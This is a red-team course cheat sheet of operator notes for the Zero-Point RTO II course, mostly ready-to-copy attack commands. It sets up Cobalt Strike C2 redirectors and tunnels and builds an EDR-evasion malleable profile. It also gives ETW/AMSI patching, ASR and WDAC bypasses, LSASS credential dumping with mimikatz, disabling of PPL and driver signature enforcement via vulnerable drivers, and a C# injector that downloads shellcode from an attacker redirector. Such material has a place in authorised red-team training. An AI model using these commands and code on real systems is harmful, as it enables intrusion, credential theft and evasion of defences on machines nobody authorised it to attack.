# Zero-Point Security Red Team Operations (RTO) II
All the concepts from the course as well as my own research, with commands provided

***DO NOT USE THIS DOCUMENT AS IS***
1. download this markdown file, and open it in [Obisidan](https://obsidian.md)
2. in Settings → Core Plugins, enable Outline, then run "Outline: Show Outline" in the command palette
     - Now you can quickly jump to a particular section by clicking its heading in the outline.
3. in Settings → Community plugins → Browse, find and install "Copy Inline Code"
     - Now you can copy any command by clicking on the end of it.
4. enter "reading" view by clicking the book in the top-right (by default)
     - Now you can see commands for linked sections by hovering over them.
## C2 Infrastructure
#### Apache Installation
on redirector,
`sudo apt install apache2`
`sudo a2enmod ssl rewrite proxy proxy_http`

`cd /etc/apache2/sites-enabled`
`sudo rm 000-default.conf`
`sudo ln -s ../sites-available/default-ssl.conf .`
`sudo systemctl restart apache2`
#### TLS Certificates
##### Redirector (Public)
on attacker (client),
`openssl genrsa -out private.key 2048`
`openssl req -new -key private.key -out request.csr`

submit csr to ca =
`nano /home/attacker/ca/ca.ext`
```
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names

[alt_names]
DNS.1 = infinity-bank.com
DNS.2 = www.infinity-bank.com
```
`openssl x509 -req -in request.csr -CA ca/ca.crt -CAkey ca/ca.key -CAcreateserial -out public.crt -days 365 -sha256 -extfile ca/ca.ext`
`openssl x509 -noout -text -in public.crt`

`scp private.key attacker@[redirector]:/home/attacker/`
`scp public.crt attacker@[redirector]:/home/attacker/`

on redirector,
`sudo cp private.key /etc/ssl/private/`
`sudo cp public.crt /etc/ssl/certs/`

verify certificate by visiting `https://[redirector]`
##### Beacon
on attacker (client),
`openssl req -x509 -nodes -newkey rsa:2048 -keyout localhost.key -out localhost.crt -sha256 -days 365 -subj '/CN=localhost'`
`openssl pkcs12 -inkey localhost.key -in localhost.crt -export -out localhost.pfx`
`keytool -importkeystore -srckeystore localhost.pfx -srcstoretype pkcs12 -destkeystore localhost.store`
`rm localhost.pfx`
`scp localhost.store attacker@[attacker]:/home/attacker/cobaltstrike/`

verify certificate with `curl -v -k https://[attacker]`
#### Apache Configuration
**Note:** The example below assumes the following. Change this as necessary to match use case.
- TLS cert public key is in /etc/ssl/certs/public.crt
- TLS cert private key is in /etc/ssl/private/private.key

`sudo nano /etc/apache2/sites-enabled/default-ssl.conf`
```
SSLCertificateFile /etc/ssl/certs/public.crt
SSLCertificateKeyFile /etc/ssl/private/private.key

SSLProxyEngine on
...
<Directory /var/www/html/>
	Options Indexes FollowSymLinks MultiViews
	AllowOverride All
	Require all granted
</Directory>
```
`sudo systemctl restart apache2`
#### Apache Rules
**Note:** The example below assumes the following. Change this as necessary to match use case.
- using the Cobalt Strike webbug profile
- data is sent via a cookie instead of in URL
- if a file exists on the redirector (in /var/www/html) it should always be returned
- **a**, **b**, **c**, and **d** are files hosted on Cobalt Strike that should be accessible
- /var/www/html/diversion is a file on the redirector that displays fake content for **a**, **b**, **c**, and **d** if they are requested using wget or curl
https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html

on redirector,
`sudo nano /var/www/html/.htaccess`
```
RewriteEngine on

# check beacon GET
RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{HTTP_COOKIE} SESSIONID
RewriteCond %{REQUEST_URI} __utm.gif
RewriteCond %{QUERY_STRING} utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]

# check beacon POST
RewriteCond %{REQUEST_METHOD} POST [NC]
RewriteCond %{REQUEST_URI} ___utm.gif
RewriteCond %{QUERY_STRING} utmac=UA-220(.*)-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]

# if a,b,c,d and using wget or curl, change file to diversion
RewriteCond %{HTTP_USER_AGENT} curl|wget [NC]
RewriteRule ^a|b|c|d$ diversion [PT]

# if file exists on redirector, show that file
RewriteCond /var/www/html/%{REQUEST_URI} -f
RewriteRule ^.*$ %{REQUEST_FILENAME} [L]

# if a,b,c,d and NOT using wget or curl, redirect to CS web server
RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} a|b|c|d
RewriteRule ^.*$ https://localhost:8443%{REQUEST_URI} [P,L]
```
#### SSH Tunnel
##### HTTPS
on attacker (client),
`scp localhost.crt attacker@[redirector]:/home/attacker/`

on redirector,
`sudo cp localhost.crt /usr/local/share/ca-certificates/`
`sudo update-ca-certificates`
verify with
- should succeed without error: `curl -v https://localhost:8443/r1`
- should fail: `curl -v -k https://[attacker]`

on attacker (server),
`ssh -N -R 8443:localhost:443 attacker@[redirector]`

AutoSSH
on attacker (server),
`nano ~/.ssh/config`
```ssh
Host                 redirector-1
HostName             10.10.0.100
User                 attacker
Port                 22
IdentityFile         /home/attacker/.ssh/id_rsa
RemoteForward        8443 localhost:443
ServerAliveInterval  30
ServerAliveCountMax  3
```
`autossh -M 0 -f -N redirector-1`
##### DNS
on attacker (server),
`ssh -N -R 5353:localhost:5353 attacker@[redirector]`
`sudo socat tcp-listen:5353,reuseaddr,fork udp4-sendto:localhost:53`

on redirector,
`sudo socat udp4-listen:53,reuseaddr,fork tcp:localhost:5353,retry,forever`

you can add socat commands to cron with
`sudo nano /etc/cron.d/redirect`
add line starting with `@reboot root`

AutoSSH
on attacker (server),
`nano ~/.ssh/config`
```ssh
Host                 redirector-2
HostName             10.10.0.200
User                 attacker
Port                 22
IdentityFile         /home/attacker/.ssh/id_rsa
RemoteForward        5353 localhost:5353
ServerAliveInterval  30
ServerAliveCountMax  3
```
`autossh -M 0 -f -N redirector-2`
##### Startup Service
repeat for all redirectors
`sudo nano /etc/systemd/system/redirector.service`
```systemd
[Unit]
Description=SSH Tunnel to Redirector

[Service]
Type=forking
User=attacker
Restart=always
RestartSec=1
ExecStart=/usr/bin/autossh -M 0 -f -N redirector

[Install]
WantedBy=multi-user.target
```

`sudo systemctl daemon-reload`
`sudo systemctl enable redirector.service`
`sudo systemctl start redirector.service`
## Cobalt Strike
#### Payload Theory

##### Shellcode
- Beacon DLL ⇒ core functionality + API only post-ex
- Reflective Loader ⇒ loads beacon, based on [Stephen Fewer's work](https://github.com/stephenfewer/ReflectiveDLLInjection)

Beacon DLL cannot be modified
Reflective Loader modified with **Arsenal Kit → User-Defined Reflective Loader**
Two options for combining
- prepend-udrl: `[ Loader ] [ Beacon ]`
- stomp-udrl: `[ Beacon [ Loader ] ]`
see [[#User-Defined Reflective Loader]] for development
##### Executable/DLL
1. read XOR'd shellcode (above) ⇒ read via a technique AV doesn't emulate
2. allocate RW memory
3. decode shellcode
4. write shellcode to memory
5. change memory to RX
6. CreateThread

Modify executable/DLL with **Arsenal Kit → Artifact Kit**
**Main**
- DLL (dllmain.c)
- EXE (main.c)
- service EXE (svcmain.c)
call start

**Bypasses** (implement start) - different shellcode reading techniques (step 1)
Techniques include
- mailslot ⇒ reads shellcode over a mailslot
- peek ⇒ sends itself a message with PostThreadMessage & combination of Sleep and GetTickCount
- pipe ⇒ reads shellcode over a named pipe
- readfile ⇒ reads itself from disk and finds embedded shellcode
call spawn

**Patch** (implements spawn)
- create thread in current process
- create thread in remote process (process injection)

Note: includes options for using syscalls (direct & indirect) and thread stack spoofing - see [[#Payload EDR Evasion]]
##### PowerShell
1. read XOR'd and base64-encoded shellcode
2. decode shellcode (base64-decode then XOR)
3. run shellcode in memory - similar to code ShellcodeRunnerv2.ps1 [here](https://ppn.snovvcrash.rocks/red-team/maldev/code-injection/shellcode-runners#reflectively-using-delegatetype-in-memory)
#### Payload EDR Evasion
##### Sleep Mask
to my best understanding, the *reflective loader?* can mask (encrypt) unnecessary parts of the shellcode between check-ins (while sleeping) so it can't be read in memory
- add the following line to your profile stage block: `set sleep_mask "true";`

Accomplished with
**Sleep Mask Kit**
OR
**Mutator Kit**, which takes the sleep mask kit's default sleep mask and runs it through [LLVM](https://www.youtube.com/watch?v=BT2Cv-Tjq7Q) obfuscation, based on [this](https://github.com/eshard/obfuscator-llvm)
- modify preferences in Cobalt Strike Sleep Mask Mutator tab
##### Thread Stack Spoofing
Looking at beacon thread stack while it's sleeping, there's a call to SleepEx and return address to beacon shellcode. This can be spotted by tools such as [Hunt-Sleeping-Beacons](https://github.com/thefLink/Hunt-Sleeping-Beacons)
Spoof thread stack using Fibers:
- if *not* using sleepmask kit, build **Arsenal Kit** specifying the stack spoof option
- if using the sleepmask kit,
1. sleepmask.c
`#define EVASIVE_SLEEP 1`
`//#include "evasive_sleep.c"`
`#include "evasive_sleep_stack_spoof.c"`
2. evasive_sleep_stack_spoof.c
    1. find a legitimate call stack to reproduce (eg. msedge.exe) - must begin with **NtWaitForSingleObject**
	2. for each call: `getFunctionOffset.exe [dll] [function] [offset]`
	3. copy generated code to **set_callstack** function
`#define CFG_BYPASS 1`
3. ensure profile stage:
    - contains `set userwx "true";`
    - does *not* contain `set obfuscate "true";`
##### Syscalls (bypass API Hooks)
Syscalls are used to avoid API hooks on functions in DLLs

**Syscall Options**
- **direct** ⇒ use the syscall instruction to directly jump to the kernel
- **indirect** ⇒ use the jmp instruction to jump to a syscall instruction in ntdll that jumps to the kernel
	- this preserves the call stack (stealthier)

**Shellcode**
When generating payloads, select System Call

**Sleep Mask**
Build the **Sleep Mask Kit**, specifying the syscalls option
**Note:** The **Mutator Kit** is not compatible with syscalls

**Executable/DLL**
Build the **Arsenal Kit → Artifact Kit**, specifying the syscalls option
- embedded ⇒ direct syscalls
- indirect ⇒ jmp to syscall instruction in corresponding Nt function (indirect)
- indirect_randomized ⇒ jmp to syscall instruction of a random Nt function
	- pro: if EDR checks return address after syscall, it'll think a different syscall was used
	- con: if EDR checks the syscall number *and* return address, it'll notice those don't match and flag as malicious
#### Profile Changes
**Note:** The example below assumes the following. Change this as necessary to match use case.
- data is sent via a cookie instead of in URL
- staged payloads are disabled
- HTTPS cert is in cobaltstrike/localhost.store
- password for the HTTPS cert is pass123

**Recommended Reading**
- [Cobalt Strike and Yara: Can I Have Your Signature](https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature) → taken down but you can still find it on the [WayBack Machine](https://archive.org/web/)
- [Harnessing the Power of Cobalt Strike for EDR Evasion](https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/)

on attacker (server),
`nano /home/attacker/cobaltstrike/c2-profiles/custom/custom.profile`
```
set tasks_max_size "2097152";
set host_stage "false";
set sleeptime "10000";

http-get {
        set uri "/__utm.gif";
        client {
                parameter "utmac" "UA-2202604-2";
                parameter "utmcn" "1";
                parameter "utmcs" "ISO-8859-1";
                parameter "utmsr" "1280x1024";
                parameter "utmsc" "32-bit";
                parameter "utmul" "en-US";
				
                metadata {
                        netbios;
                        prepend "SESSIONID=";
                        header "Cookie";
                }
        }
		
        server {
                header "Content-Type" "image/gif";
				
                output {
                        # hexdump pixel.gif
                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
                        # 0000020 01 00 01 00 00 02 01 44 00 3b
						
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
						
                        print;
                }
        }
}

http-post {
        set uri "/___utm.gif";
        client {
                header "Content-Type" "application/octet-stream";
				
                id {
                        prepend "UA-220";
                        append "-2";
                        parameter "utmac";
                }
				
                parameter "utmcn" "1";
                parameter "utmcs" "ISO-8859-1";
                parameter "utmsr" "1280x1024";
                parameter "utmsc" "32-bit";
                parameter "utmul" "en-US";
				
                output {
                        print;
                }
        }
		
        server {
                header "Content-Type" "image/gif";
				
                output {
                        prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
                        print;
                }
        }
}

https-certificate {
        set keystore "localhost.store";
        set password "pass123";
}

stage {
        # EDR Evasion -> Sleep Mask Kit
        set sleep_mask "true";
		
        # Defence Evasion -> Memory Permissions & Cleanup
        set cleanup "true";
		
		# mask text section during sleep (see sleep mask kit -> mask_text_section.c)
        set userwx "true";
        
		# not compatible with sleep mask kit
        #set obfuscate "true";
        set magic_pe "TL";
        set magic_mz_x64 "AYAQ";
		
        transform-x64 {
                prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
                strrep "(admin)" "(adm1n)";
                strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
                strrep "\x25\xff\xff\xff\x00\x3D\x41\x41\x41\x00" "\xB8\x41\x41\x41\x00\x3D\x41\x41\x41\x00";
                # strrep "\x4D\x5A\x41\x52\x55\x48\x89\xE5\x48\x81\xEC\x20\x00\x00\x00\x48\x8D\x1D\xEA\xFF\xFF\xFF\x48\x89\xDF\x48\x81\xC3\xD4\x88\x01\x00\xFF\xD3\x41\xB8\xF0\xB5\xA2\x56\x68\x04\x00\x00\x00\x5A\x48\x89\xF9\xFF\xD0" "\x4D\x5A\x48\x8D\x1D\xF8\xFF\xFF\xFF\x41\x52\x48\x83\xEC\x28\x48\x89\xDF\x48\x81\xC3\x52\xB7\x00\x00\x48\x81\xC3\x52\xB7\x00\x00\xFF\xD3\x48\xC7\xC2\x04\x00\x00\x00\x48\x89\xF9\xFF\xD0";
        }
}

process-inject {
        set startrwx "false";
        set userwx "false";
        set bof_reuse_memory "false";
        set allocator "NtMapViewOfSection";
}

post-ex {
        # Fork and Run Memory Allocations
        set obfuscate "true";
        set cleanup "true";
		
        # SpawnTo
        set spawnto_x86 "c:\\windows\\syswow64\\cmd.exe";
        set spawnto_x64 "C:\\program files (x86)\\microsoft\\edge\\application\\msedge.exe";
		
        # SMB Named Pipes Names
        # include pound (#) for random hex digit
        set pipename "TSVCPIPE-########-####-####-####-############";
}
```
`cd ~/cobaltstrike`
check for errors: `./c2lint c2-profiles/custom/custom.profile`
#### Aggressor Scripts
`C:\Tools\cobaltstrike\process-inject\processinject.cna`
powerpick and execute-assembly etw bypass
`C:\Tools\InlineExecute-Assembly\inlineExecute-Assembly\inlineExecute-Assembly.cna`
`C:\Tools\RedOctober\RedOctober.cna`
`C:\Tools\cobaltstrike\gdrv\gdrv.cna`
`C:\Tools\cobaltstrike\ppenum\ppenum.cna`
`C:\Tools\cobaltstrike\sleepmask\sleepmask.cna`
#### Payload Guardrails
when creating a listener, to the right of Guardrails, click `...`
**Examples**
- IP Address: `10.10.*.*`
- User Name (case sensitive): `svc_*`
- Server Name (case sensitive)
- Domain (case sensitive): `*.acme.corp`
## Post-Exploitation

Command Categories
- House-Keeping - beacon configuration
- API Only - built into payload using Windows API
- Inline Execution - Beacon Object Files executed within process
- Fork & Run - spawn temporary process and inject DLL
Exceptions
- spawn cmd.exe (shell)
- spawn powershell.exe (jump winrm/64, remote-exec winrm)
- spawn arbitrary process (run)
[Commands and OPSEC Considerations](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm)

**Fork & Run**: process injection → reflective load post-ex DLL (similar to [[#Payload Theory]])
Modify process injection with **Process Injection Kit**
Modify reflective DLL loader with **User-Defined Reflective Loader Kit**
#### BOF Memory Allocations
sleep BOF for testing (to inspect memory)
```c++
#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT VOID WINAPI KERNEL32$Sleep(DWORD);

void go(char* args, int len) {
	KERNEL32$Sleep(30000);
}
```
VS command prompt: `cl.exe /c /GS- bof.c /Fo bof.o`
Linux: `x86_64-w64-mingw32-gcc -c bof.c -o bof.o`

run in Cobalt Strike with `inline-execute [path]\bof.o`
#### Process Injection Kit
`cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/process_inject`
`./build.sh /mnt/c/Tools/cobaltstrike/process-inject`
#### ETW
powerpick and execute-assembly etw bypass (save as .cna)
```
# $1 - the id for the beacon
# $2 - the cmdlet and arguments
# $3 - [optional] if specified, powershell-import script is ignored and this argument is treated as the download cradle to prepend to the command
# $4 - [optional] PATCHES

alias powerpick-patched {
	bpowerpick($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C300");
}

# $1 - the id for the beacon
# $2 - the local path to the .NET executable assembly
# $3 - parameters to pass to the assembly
# $4 - [optional] PATCHES

alias execute-assembly-patched {
	bexecute_assembly($1, $2, $3, "PATCHES: ntdll.dll,EtwEventWrite,0,C300");
}
```
#### Inline (.NET) Execution
`inlineExecute-Assembly --amsi --etw --appdomain [domain] --pipe [pipe] --dotnetassembly [assembly] --assemblyargs [args]`
`inlineExecute-Assembly --amsi --etw --appdomain SharedDomain --pipe dotnet-diagnostic-1337 --dotnetassembly [assembly] --assemblyargs [args]`
#### Fork & Run
spoof ppid: `ppid [pid]`
process to spawn: `spawnto x64 [path]`
spoof arguments: `argue [command] [fake args]`
block non-Microsoft DLLs: `blockdlls start`
#### Native Processes to Spawn/Inject
Processes that make LDAP queries:
- ServerManager.exe
- dsac.exe
- gpresult.exe
- AzureADConnect.exe
eg. `spawnto x64 %windir%\sysnative\gpresult.exe`

Processes that load System.Management.Automation.dll (for PowerShell):
- msiexec.exe
eg. `spawnto x64 %windir%\sysnative\msiexec.exe`
#### Kernel Callbacks
triggered when particular events occur:
- process/thread creation
- image/DLL loads
- registry operations

load RedOctober driver: [[#Load Kernel Driver]]
`list_process_callbacks`
`zero_process_callback [id]`
## Attack Surface Reduction
Only available if Defender is primary AV

**Rules** can be read by any user
**Exclusions** can only be read by local admin
Types of exclusions:
- default exclusions by Microsoft
- custom exclusions - usually defined in GPO
#### Enumerating Enabled Rules
In registry
command line: `reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\ExploitGuard_ASR_Rules"`
beacon: `reg queryv x64 HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR ExploitGuard_ASR_Rules`
- 0 ⇒ disabled
- 1 ⇒ enabled
rules in `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Windows Defender Exploit Guard\ASR\Rules`
- 0 ⇒ disabled
- 1 ⇒ block
- 2 ⇒ audit
compare rule GUIDs with names [here](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#asr-rule-to-guid-matrix)

In Defender
`(Get-MpPreference).AttackSurfaceReductionRules_Ids`
`(Get-MpPreference).AttackSurfaceReductionRules_Actions`

In GPO
[[#Read GPO]]
#### Reversing ASR Exclusions
`cp /mnt/c/ProgramData/Microsoft/Windows\ Defender/Definition\ Updates/Backup/mpasbase.vdm .`
`python3 wd-extract.py mpasbase.vdm --decompile wd-extracted`

`cd wd-extracted`
`grep "Block all Office applications from creating child processes" *.lua`
open file and look for `GetPathExclusions`
#### MS Office Rules
Three relevant rules
- Block all Office applications from creating child processes
- Block Win32 API calls from Office macros
- Block Office applications from injecting code into other processes
##### GadgetToJScript
```c#
namespace TestAssembly
{
	public class Program
	{
		public Program()
		{
			byte[] shellcode;
			
			// download shellcode
			using (var client = new WebClient())
			{   
				// make proxy aware
				client.Proxy = WebRequest.GetSystemWebProxy();
				client.UseDefaultCredentials = true;
				
				// set allowed tls versions
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;
				
				shellcode = client.DownloadData("https://[redirector]/shellcode.bin");
			};
			
			// create suspended MS Edge process
			var startup = new STARTUPINFO { dwFlags = 0x00000001 };
			startup.cb = Marshal.SizeOf(startup);
			
			var success = CreateProcessW(
				@"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
				@"""C:\Program Files\(x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start /prefetch:5""",
				IntPtr.Zero,
				IntPtr.Zero,
				false,
				CREATION_FLAGS.CREATE_NO_WINDOW | CREATION_FLAGS.CREATE_SUSPENDED,
				IntPtr.Zero,
				@"C:\Program Files (x86)\Microsoft\Edge\Application",
				ref startup,
				out var processInfo);
			
			// allocate RW memory
			var baseAddress = VirtualAllocEx(
				processInfo.hProcess,
				IntPtr.Zero,
				(uint)shellcode.Length,
				ALLOCATION_TYPE.MEM_COMMIT | ALLOCATION_TYPE.MEM_RESERVE,
				PROTECTION_FLAGS.PAGE_READWRITE);
			
			// inject shellcode
			success = WriteProcessMemory(
				processInfo.hProcess,
				baseAddress,
				shellcode,
				(uint)shellcode.Length,
				out _);
			
			// change memory from RW to RX
			success = VirtualProtectEx(
				processInfo.hProcess,
				baseAddress,
				(uint)shellcode.Length,
				PROTECTION_FLAGS.PAGE_EXECUTE_READ,
				out _);
			
			// run shellcode with QueueUserAPC
			_ = Win32.QueueUserAPC(
				baseAddress,
				processInfo.hThread,
				IntPtr.Zero);
			
			Win32.ResumeThread(processInfo.hThread);
			
			Win32.CloseHandle(processInfo.hThread);
			Win32.CloseHandle(processInfo.hProcess);
		}
	}
}
```
`C:\Tools\GadgetToJScript\GadgetToJScript\bin\Release\GadgetToJScript.exe -w vba -b -e hex -o C:\Payloads\inject -a C:\Tools\GadgetToJScript\TestAssembly\bin\Release\TestAssembly.dll`
#### Process Creations from PSExec & WMI
`grep "Block process creations originating from PSExec and WMI commands" *.lua`
looking at **GetMonitoredLocations**, Cobalt Strike's psexec is not blocked
open file and look for `GetCommandLineExclusions`
- example exclusion: `:\Windows\ccmcache`

string together with &
`execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=[target] command="C:\Windows\System32\cmd.exe /c dir C:\Windows\ccmcache\ & C:\Windows\notepad.exe"`
or add arbitrary arguments to a Beacon payload
`cd \\[target]\admin$`
`upload C:\Payloads\smb_x64.exe`
`execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=[target] command="C:\Windows\smb_x64.exe --path C:\Windows\ccmcache\cache"`
#### Credential Stealing from LSASS
`grep "Block credential stealing from LSASS" *.lua`
open file and look for `GetPathExclusions`

feel free to replace mrt.exe with another exclusion:
`spawnto x64 c:\windows\system32\mrt.exe`
`mimikatz [...]`
or
`ps`
look for already running exclusion
`mimikatz [pid] x64 [...]`
## WDAC
Basically advanced AppLocker only for Windows 10+

Commonly used rules:
- Hash - allows binaries to run based on their hash values
- FileName - allows binaries to run based on their original filename
- FilePath - allows binaries to run from specific file path locations
- Publisher - allows binaries to run that are signed by a particular CA
Common exceptions: [Ultimate WDAC Bypass List](https://github.com/bohops/UltimateWDACBypassList)
#### Enumerating WDAC Rules
On disk
`download C:\Windows\System32\CodeIntegrity\CIPolicy.p7b`

In GPO
[[#Read GPO]]
**ValueData** is the p7b file containing the WDAC rules
`download [path]`
#### Reversing WDAC Rules
`ipmo C:\Tools\CIPolicyParser.ps1`
`ConvertTo-CIPolicy -BinaryFilePath .\CIPolicy.p7b -XmlFilePath CIPolicy.xml`
open `CIPolicy.xml`
#### Trusted Signers
look for **Signer** entry in WDAC policy

find already signed binary
`Get-AuthenticodeSignature -FilePath '[signed]' | fl`
remember **Subject**

`execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas`
`execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /ca:[ca]`
look for **Code Signing** template
##### Sign Custom Binary
**Note:** This can also be done with the mmc certificates snap-in

create req.inf
```inf
[NewRequest]
Subject = "[subject]"

KeySpec = 1
KeyLength = 2048
Exportable = TRUE
MachineKeySet = FALSE
SMIME = False
PrivateKeyArchive = FALSE
UserProtected = FALSE
UseExistingKeySet = FALSE
ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
ProviderType = 12
RequestType = PKCS10
KeyUsage = 0xa0
HashAlgorithm = SHA256

[RequestAttributes]
CertificateTemplate=[template]

[EnhancedKeyUsageExtension]
OID=1.3.6.1.5.5.7.3.3
```

Request Certificate
`certreq -new -config [ca] req.inf req.csr`
`certreq -submit -config [ca] req.csr cert.cer`
`certreq -accept cert.cer`

Export to PFX
get certificate ID with `certutil -user -store My`
`certutil -user -exportpfx -privatekey -p [password] My [id] cert.pfx`

Sign Binary (Visual Studio developer prompt)
`signtool sign /f cert.pfx /p [password] /fd SHA256 [binary]`
##### Sign Cobalt Strike Payloads
on attacker,
`keytool -genkey -alias server -keyalg RSA -keysize 2048 -storetype jks -keystore keystore.jks -dname "[subject]"`
`keytool -certreq -alias server -keystore keystore.jks -file req.csr`
`cat req.csr`

https://[ca]/certsrv/
Request a certificate → advanced certificate request
paste CSR into box → Submit >
DER encoded → Download certificate chain

`keytool -import -trustcacerts -alias server -file [chain].p7b -keystore keystore.jks`
in profile,
```
code-signer {
	set keystore "keystore.jks";
	set password "[password]";
	set alias "server";
}
```
check "Sign" when generating payloads
## Protected Processes
Protected Processes (PP) vs Protected Processes Light (PPL) aka LSA Protection
- PP can access PP or PPL if signer is equal or greater
- PPL can access PPL if signer is equal or greater
- PPL can never access PP
`ppenum [pid]`
#### Circumventing PPL
options
- userland bypass - change over time
- kernel driver - guaranteed to work
example drivers
- [PPLcontrol](https://github.com/itm4n/PPLcontrol)
- [mimidrv](https://github.com/gentilkiwi/mimikatz/tree/master/mimidrv)

[[#Load Kernel Driver]]
#### Dumping LSASS
`ps`
look for lsass.exe
`unprotect_process [pid]`
confirm with `ppenum [pid]`
`mimikatz [...]`
## Testing EDR Evasion
#### YARA Rules
check file signature: `C:\Tools\protections-artifacts\yara64.exe -s yara\rules\[rule].yar C:\Payloads\[payload]`
check process memory: `C:\Tools\protections-artifacts\yara64.exe -s yara\rules\[rule].yar [pid]`
#### API Hooking
**Create Test Hooks**
`bcdedit -set testsigning on`
`shutdown /r /t 0`

`C:\Tools\injdrv\injdrv.exe -i`
Registers two kernel callbacks:
- PsSetCreateProcessNotifyRoutineEx ⇒ process create/destroy
- PsSetLoadImageNotifeRoutine ⇒ image/DLL load

**Detect Hooks**
`execute-assembly C:\Tools\OffensiveCSharp\HookDetector\bin\Release\HookDetector.exe`

**View Instructions** (WinDbg)
File → Attach to process
`u ntdll!NtOpenProcess`
#### User-Defined Reflective Loader
1. unload all aggressor scripts that influence payload generation
2. create a new HTTP listener
3. generate shellcode without guardrails or syscalls
4. pack the shellcode into the UDRL source code
`cd C:\Tools\cobaltstrike\arsenal-kit\kits\udrl-vs`
`py.exe .\udrl.py xxd C:\Payloads\http_x64.xprocess.bin .\library\DebugDLL.x64.h`

For release, check the cna files in in the bin folder
`cd C:\Tools\cobaltstrike\arsenal-kit\kits\udrl-vs\bin\default-loader`
## Misc
#### Read GPO
`powerpick Get-DomainGPO -Properties DisplayName,gpcfilesyspath | sort -Property DisplayName`

`gc "[gpcfilesyspath]\Machine\Registry.pol"`
or
`download [gpcfilesyspath]\Machine\Registry.pol`
`Install-Module -Name GPRegistryPolicyParser`
`Parse-PolFile -Path Registry.pol`
#### Load Kernel Driver
##### Without DSE Bypass
if kernel driver is not legitimately signed, see [[#With DSE Bypass]]

Upload PPL Driver
`cd C:\Windows\System32\drivers`
`upload C:\Tools\RedOctober\RedOctober.sys`
`run sc create redoct type= kernel binPath= C:\Windows\System32\drivers\RedOctober.sys`

Start PPL Driver
`run sc start redoct`
##### With DSE Bypass
required when kernel driver is not legitimately signed

find a known vulnerable legitimately signed driver: [LOLDrivers](https://www.loldrivers.io)
replace gdrv.sys with vulnerable driver as necessary

Upload PPL Driver
`cd C:\Windows\System32\drivers`
`upload C:\Tools\RedOctober\RedOctober.sys`
`run sc create redoct type= kernel binPath= C:\Windows\System32\drivers\RedOctober.sys`

Upload Known Vulnerable Driver
`upload C:\Tools\cobaltstrike\gdrv\gdrv.sys`
`run sc create gdrv type= kernel binPath= C:\Windows\System32\drivers\gdrv.sys`
`run sc start gdrv`

Disable DSE and Start PPL Driver
**Note:** re-enable DSE as quickly as possible
`disable_dse`
`run sc start redoct`
`enable_dse`

Unload and Remove Vulnerable Driver
`run sc stop gdrv`
`run sc delete gdrv`
`rm gdrv.sys`
